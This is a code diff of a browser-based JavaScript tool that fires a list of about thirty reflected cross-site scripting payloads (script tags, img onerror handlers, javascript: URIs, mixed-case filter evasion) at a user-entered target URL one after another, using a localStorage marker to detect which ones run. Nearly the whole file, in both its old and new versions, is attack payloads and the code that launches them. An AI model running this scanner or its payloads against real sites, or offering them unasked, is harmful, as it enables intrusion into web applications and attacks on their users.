@@ -1,55 +1,68 @@
-var targetActive=null;
-var payload=[
-	"<script>{EXEC}</script>",
-	"<script>{EXEC}</script>",
-	"\"><img src='x' onerror=\"{EXEC}\"/>",
-	"\"><img src='x' onerror=\"{EXEC}\"/>",
-	"<script>{EXEC}</script>",
-	"<ScRipT>{EXEC}</ScRipT>",
-	"<script>{EXEC}</script>",
-	"<script>{EXEC};alert(\"hellox worldss\");</script>",
-	"<script>{EXEC}</script>",
-	"<script>{EXEC}alert(“XSS”);</script>",
-	"<script>{EXEC}alert(‘XSS’)</script>",
-	"“><script>{EXEC}alert(“XSS”)</script>",
-	"<script>{EXEC}alert(/XSS”)</script>",
-	"<script>{EXEC}alert(/XSS/)</script>",
-	"</script><script>{EXEC}alert(1)</script>",
-	"‘; {EXEC}alert(1);",
-	"‘){EXEC}alert(1);//",
-	"<ScRiPt>{EXEC}alert(1)</sCriPt>",
-	"<IMG SRC=jAVasCrIPt:{EXEC}alert(‘XSS’)>",
-	"<IMG SRC=”javascript:{EXEC}alert(‘XSS’);”>",
-	"<IMG SRC=javascript:{EXEC}alert(&quot;XSS&quot;)>",
-	"<IMG SRC=javascript:{EXEC}alert(‘XSS’)>",
-	"<img src=xss onerror={EXEC}alert(1)>",
-];
-var l=payload.length;
-var i=0;
-function testAlert(url){
-	rep=setInterval(runAlertXSS,1500);
-	targetActive=window.open(url,'_blank');
-	if(targetActive==null){
+var w=null;
+var target=document.getElementById("target").value;
+var prot=target.match(/^http(s)?/);
+target=(prot===null)?"http://"+target:target;
+var res=document.getElementById("res");
+document.getElementsByTagName("a")[0].onclick=function(e){
+	w=window.open('http://example.com','_blank');
+	if(w==null){
 		return true;
+	}else{
+		alertXSS();
+		return false;
 	}
-	return false;
 }
-var res="";
-function runAlertXSS(){
-	clearInterval(rep);
-	rep=setInterval(runAlertXSS,1500);
-	target=document.getElementById("target").value;
-	if(!(targetActive==null)){
-		var exec="localStorage.payload"+i+"+='Ok';alert("+i+");";
-		payload[i]=payload[i].replace("{EXEC}",exec);
-		testURI=target+payload[i];
-		res+=("\n[+]Payload["+i+"]: "+payload[i]).trim();
-		res+="\n\n################################\n\n";
-		document.getElementById("res").innerHTML+=res;
-		targetActive.location.href=testURI;
+var alertXSS=function(){
+	if(w!=null){
+		let exec=null;
+		let payloads='\
+			"><script>{EXEC}alert()</script>,\
+			"><script>{EXEC}alert``</script>,\
+			"><script>{EXEC}alert("")</script>,\
+			"><script>{EXEC}alert(\'\')</script>,\
+			"><script>{EXEC}alert(//)</script>,\
+			"><script>{EXEC}alert.apply();</script>,\
+			"><img src=""/onerror="{EXEC};alert()">,\
+			<script>{EXEC}</script>,\
+			<script>{EXEC}</script>,\
+			\"><img src="x" onerror=\"{EXEC}\"/>,\
+			\"><img src="x" onerror=\"{EXEC}\"/>,\
+			<script>{EXEC}</script>,\
+			<ScRipT>{EXEC}</ScRipT>,\
+			<script>{EXEC}</script>,\
+			<script>{EXEC};alert(\"hellox worldss\");</script>,\
+			<script>{EXEC}</script>,\
+			<script>{EXEC}alert(“XSS”);</script>,\
+			<script>{EXEC}alert(‘XSS’)</script>,\
+			“><script>{EXEC}alert(“XSS”)</script>,\
+			<script>{EXEC}alert(/XSS”)</script>,\
+			<script>{EXEC}alert(/XSS/)</script>,\
+			</script><script>{EXEC}alert(1)</script>,\
+			‘; {EXEC}alert(1);,\
+			‘){EXEC}alert(1);//,\
+			<ScRiPt>{EXEC}alert(1)</sCriPt>,\
+			<IMG SRC=jAVasCrIPt:{EXEC}alert(‘XSS’)>,\
+			<IMG SRC=”javascript:{EXEC}alert(‘XSS’);”>,\
+			<IMG SRC=javascript:{EXEC}alert(&quot;XSS&quot;)>,\
+			<IMG SRC=javascript:{EXEC}alert(‘XSS’)>,\
+			<img src=xss onerror={EXEC}alert(1)>,\
+		';
+		payloads=payloads.split(",");
+		i=0;
+		l=payloads.length;
+		rep=setInterval(function(){
+			if(payloads[i]===undefined){
+				clearInterval(rep);
+			}
+			let exec="localStorage.payload"+i+"='Ok';";
+			payloads[i]=payloads[i].replace("{EXEC}",exec);
+			payload=payloads[i].trim();
+			w.location=target+payload;
+			console.log(payload);
+			res.innerHTML+="\n"+"#".repeat(90)+"\n";
+			res.innerHTML+="[+]payload["+i+"]: "+payload;
+			res.innerHTML+="\n"+"#".repeat(90)+"\n";
+			i++;
+		},1000);
 	}
-	if(payload[i]===undefined){
-		clearInterval(rep);
-	}
-	i++;
-}
+};
